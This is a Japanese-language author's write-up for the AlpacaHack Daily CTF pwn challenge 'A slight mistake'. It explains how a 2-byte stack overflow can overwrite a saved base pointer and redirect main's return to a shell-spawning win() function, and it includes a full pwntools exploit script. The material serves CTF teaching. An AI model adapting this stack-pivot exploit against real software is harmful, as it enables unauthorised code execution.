---
title: "A slight mistake - AlpacaHack Daily"
category: "pwn"
subcategory: "pwn"
type: "writeup"
tags: ["pwn", "alpacahack", "slight", "mistake", "binary-exploitation", "a-slight-mistake"]
summary: "pwn writeup for \"A slight mistake\" from AlpacaHack Daily - techniques: alpacahack, slight, mistake, binary-exploitation, a-slight-mistake."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "A slight mistake"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** A slight mistake
- **Date:** 2026-07-11
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/README.md>

---
# A slight mistake

## はじめに

今回はちょっと難しいPwnジャンル問題の作成に挑戦してみました。

Pwnジャンル問題って、解くのも作るのもなかなかとっつきづらいところがありますが、その分うまくできると気持ちいいですよね。

今回の問題についても、作っていて自分でも「そんなことができるんだー」と、勉強になりました。

というわけで、A slight mistake（ちょっとした間違い）のAuther's writeupです。

## 問題

あ、ちょっと間違えちゃった。まあいっか、どうせこれだけじゃ何もできっこないし。

```c
void win(void)
{
    execve("/bin/sh", NULL, NULL);
}

void greet(void)
{
    char name[64];

    printf("your name> ");
    read(0, name, 66);
    remove_newline(name);
    printf("Hello, %s! Nice to meet you!\n", name);
}

int main(void)
{
    char alpaca[] = "alpaca-pacapaca";

    printf("[leaked] address of `alpaca`: %p\n", alpaca);
    greet();

    return 0;
}
```

## 概要

実行すると、いきなりalpaca配列のアドレスが表示されます。

その後名前の入力を求められるので、入力すると、

```
$ nc localhost 1337
[leaked] address of `alpaca`: 0x7ffe0f103940
your name> Baumroll1234
Hello, Baumroll1234! Nice to meet you!
```

挨拶されただけで終わってしまいました。

例によってwin関数はどこからも呼ばれていませんが、どうすればシェルを取れるのでしょうか？

## 方針

BOFを使ってgreet関数のSaved RBPを改ざんし、main関数のReturn Addressをname配列内に仕込んだ場所から読ませる。

## 解法

### このプログラムの脆弱性

まず、問題文で「ちょっと間違えちゃった」と言っているように、このgreet関数には脆弱性があります。

```c
    read(0, name, 66);
```

name配列のサイズは64ですが、このread関数は66バイト読み込めるようになっていて、2バイトだけあふれてさせることができてしまいます。

通常このような問題では、greet関数のReturn Addressをwin関数のアドレスに書き換え、greet関数を抜けるときにmain関数のつづきではなくwin関数に飛ばすことが多いようです。

しかし、後述のとおり今回はその方法は使えません。どうすればいいのでしょうか？

### スタックの動きを追ってみる

最初にmain関数の実行が始まり、
```
push %rbp       # ベースポインタをスタックに積んで退避する
mov %rsp, %rbp  # スタックポインタをベースポインタにコピーし、スタックを空にする
sub %0x10, %rsp # スタックポインタを下げ、ローカル変数の領域を確保する
```
が実行されると、ローカル変数alpaca[16]の領域が確保され、スタックは下記のようになります。

```
↑上位アドレス
----------------------------
main関数のReturn Address(8)
----------------------------
main関数のSaved RBP(8)
---------------------------- ← ベースポインタ
alpaca[15]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/16)
---------------------------- ← スタックポインタ → リーク情報
↓下位アドレス
```
※今回は-fno-stack-protectorオプションがついているので、スタックカナリアはありません。また、配列のサイズは全て16バイトの倍数になっているので、パディングもありません。

※ベースポインタとは現在のスタックの底、スタックポインタとはスタックのてっぺんの場所を指すものだと思ってください。また、スタックは下方向に伸びることにも注意が必要です。

そして、greet関数が呼び出され、
```
push %rbp       # ベースポインタをスタックに積んで退避する
mov %rsp, %rbp  # スタックポインタをベースポインタにコピーし、スタックを空にする
sub %0x40, %rsp # スタックポインタを下げ、ローカル変数の領域を確保する
```
が実行されると、ローカル変数name[64]の領域が確保され、スタックは下記のようになります。

```
↑上位アドレス
----------------------------
main関数のReturn Address(8)
----------------------------
main関数のSaved RBP(8)
---------------------------- p1
alpaca[15]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/16)
----------------------------
greet関数のReturn Address(8)
----------------------------
greet関数のSaved RBP(8) = p1
---------------------------- ← ベースポインタ
name[63]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/64)
---------------------------- ← スタックポインタ
↓下位アドレス
```

今回の問題ではnameから2バイトあふれさせることができるので、「greet関数のSaved RBP」の下位2バイトだけ書き換えることができます。

しかし、「greet関数のReturn Address」はnameより8～15バイト上にあるので、2バイトの書き換えでは届きません。

では、Return Adressの書き換えはあきらめて、Saved RBPを書き換えると何ができるでしょうか？

例えば、Saved RBPをname[48]のアドレスに書き換えることができたとすると、下記のようになります。

```
↑上位アドレス
----------------------------
（略）
----------------------------
greet関数のReturn Address(8)
----------------------------
改ざんされたSaved RBP(8) = p2
---------------------------- ← ベースポインタ
name[63]～[56](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
----------------------------
name[55]～[48](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
---------------------------- p2
name[47]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/48)
---------------------------- ← スタックポインタ
↓下位アドレス
```

この状態でgreet関数を抜けるとき、
```
leave
ret
```
が実行されますが、これは実質
```
mov %rbp, %rsp # ベースポインタをスタックポインタにコピーし、ローカル変数を開放する
pop %rbp       # スタックからSaved RBPをベースポインタに取り出しベースポインタを復旧する
pop %rip       # スタックからReturn Addressを命令ポインタに取り出して実行位置を呼び出し元の次に戻す
```
です。

これらが実行されると、

```
↑上位アドレス
----------------------------
greet関数のReturn Address(8)
----------------------------
改ざんされたSaved RBP(8) = p2
---------------------------- ← ベースポインタ & スタックポインタ
name[63]～[56](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
----------------------------
name[55]～[48](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
---------------------------- p2
name[47]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/48)
----------------------------
↓下位アドレス
```

こうなって、

```
↑上位アドレス
----------------------------
greet関数のReturn Address(8)
---------------------------- ← スタックポインタ
改ざんされたSaved RBP(8) = p2 ⇒ ベースポインタ
----------------------------
name[63]～[56](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
----------------------------
name[55]～[48](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
---------------------------- p2 ← ベースポインタ
name[47]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/48)
----------------------------
↓下位アドレス
```

こうなって、

```
↑上位アドレス
---------------------------- ← スタックポインタ
greet関数のReturn Address(8) ⇒ 命令ポインタ
----------------------------
改ざんされたSaved RBP(8) = p2
----------------------------
name[63]～[56](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
----------------------------
name[55]～[48](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
---------------------------- p2 ← ベースポインタ
name[47]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/48)
----------------------------
↓下位アドレス
```

こうなります。

この段階では、ベースポインタがスタックポインタより下にあるというおかしな状況ではあるものの、命令ポインタ（=次に実行される命令の場所）RIPには正規のReturn Addressが読み込まれるため、main関数の正しい実行位置に戻ることになります。

また、greet関数の処理が終わって抜けたところでただちにローカル変数name配列の内容が消去されたりすることはなく、次に書き換えが起こるまでは残り続けることになります。

その後main関数を抜けるときも同様に
```
leave
ret
```
が実行されますが、そうすると、（※戻り値`0`の扱いについては省略します）

```
↑上位アドレス
----------------------------
greet関数のReturn Address(8)
----------------------------
改ざんされたSaved RBP(8) = p2
----------------------------
name[63]～[56](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
----------------------------
name[55]～[48](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
---------------------------- p2 ← ベースポインタ & スタックポインタ
name[47]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/48)
----------------------------
↓下位アドレス
```

こうなって、

```
↑上位アドレス
----------------------------
greet関数のReturn Address(8)
----------------------------
改ざんされたSaved RBP(8) = p2
----------------------------
name[63]～[56](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
----------------------------  ← スタックポインタ
name[55]～[48](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8) ⇒ ベースポインタ
---------------------------- p2
name[47]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/48)
----------------------------
↓下位アドレス
```

こうなって、

```
↑上位アドレス
----------------------------
greet関数のReturn Address(8)
----------------------------
改ざんされたSaved RBP(8) = p2
---------------------------- ← スタックポインタ
name[63]～[56](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8) ⇒ 命令ポインタ
----------------------------
name[55]～[48](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
---------------------------- p2
name[47]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/48)
----------------------------
↓下位アドレス
```

こうなります。

このとき、命令ポインタRIPはname[56]～[63]の場所を読み込んでしまうので、ここにwin関数のアドレスが仕込まれていると、win関数に飛んでしまいます。

この場所は既に入力した領域であるため、win関数のアドレスを仕込むことができます。

### ペイロードを作成する

では、具体的にはどのようなペイロードを送ればいいのでしょうか？

win関数のアドレスは-no-pieオプションにより固定されますが、スタックは動的に配置されるため、改ざんRBPの値についてはリークされたalpaca配列のアドレスから求める必要があります。

もう一度スタックの全体像を見てみましょう。

```
↑上位アドレス
----------------------------
main関数のReturn Address(8)
----------------------------
main関数のSaved RBP(8)
---------------------------- p1
alpaca[15]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/16)
---------------------------- → リーク情報
greet関数のReturn Address(8)
----------------------------
改ざんされたSaved RBP(8) = p2
----------------------------
name[63]～[56](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
----------------------------
name[55]～[48](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/8)
---------------------------- p2
name[47]～[0](https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d11_A_slight_mistake/48)
----------------------------
↓下位アドレス
```

ほしいのはp2のアドレスです。

これは、リーク情報より32バイト下にあります。

よって、リーク情報から32を引いたものの下位2バイトをあふれさせる、すなわちname[64]～[65]に仕込めば良さそうです。

これは、正規のSaved RBP(p1)と改ざん後のSaved RBP(p2)の差は48バイトしかないので、これらの上位6バイトは一致していると考えられるからです。

※それでも $`48 ÷ 65536 = 0.073 \%`$ の確率で2バイトの書き換えでは足りず失敗しますが、よっぽどの強運（凶運？）の持ち主でない限りは成功するでしょう。

あとは前述のようにname[56]～[63]の位置にwin関数のアドレスを仕込めばいいので、作成すべきペイロードは、
```
パディング(48) + ダミーのRBP(8) + win関数のアドレス(8) + リーク情報-32の下位2バイト(2)
```
のようになります。

※ダミーのRBPにもちゃんとそれっぽい値を仕込んでもいいですが、その後どこでも使われないのでてきとーな値で大丈夫です。

```py
from pwn import *
from pathlib import Path

#HOST, PORT = "localhost", 1337
HOST, PORT = 123.45.67.89, 12345

e = ELF("./chall")
win_adr = e.symbols['win']
print(f"{win_adr = } ({hex(win_adr)})")

p = remote(HOST, PORT)
d = p.recvuntil(b'> ')
leaked_info = d.decode().split()[-3]
print(f"{leaked_info = }")

payload = b'A' * 56
payload += p64(win_adr)
payload += p64(int(leaked_info[2:], 16) - 32)[:2]
print("payload(hex) =", payload.hex())
p.sendline(payload)

p.sendline(b'cat flag.txt')
p.interactive()
```

※win関数のアドレスはELF解析で直接取得していますが、下記のコマンドで確認して直接打ち込んでも良いです。
```
$ nm chall | grep win
00000000004011b6 T win
```

## おわりに

これまでの過去問でSaved RBPを改ざんする問題は無かった（baumroll1234調べ）ので作成してみましたが、いかがでしたでしょうか？

ところで、挑戦してくださった方の中には、「main関数のalpaca配列は必要ある？」と思った方もいるかもしれません。

実はこのalpaca配列には、この問題を解く上で重要な役割があります。

このalpaca配列が無いと、main関数のエピローグ処理で`leave`が実行されず、`pop $rbp`だけで済まされてしまいます。

すると、RSPを改ざんしたRBPに飛ばすことができず、正規のRBPとReturn Addressを読みにいってしまい、攻撃が失敗してしまいます。

このalpaca配列は`leave`を確実に実行させ攻撃を成功させるために必要不可欠な存在であったというわけです。

さて、次はどんな問題を作成しましょうかね？

問題を作るのって、解くのと同じくらいかそれ以上に頭を使うし勉強になるし楽しいです。

まだまだ未熟な初心者ですが、少しでも皆さんに楽しんでいただけるような問題を作れるように頑張っていきたいと思います。
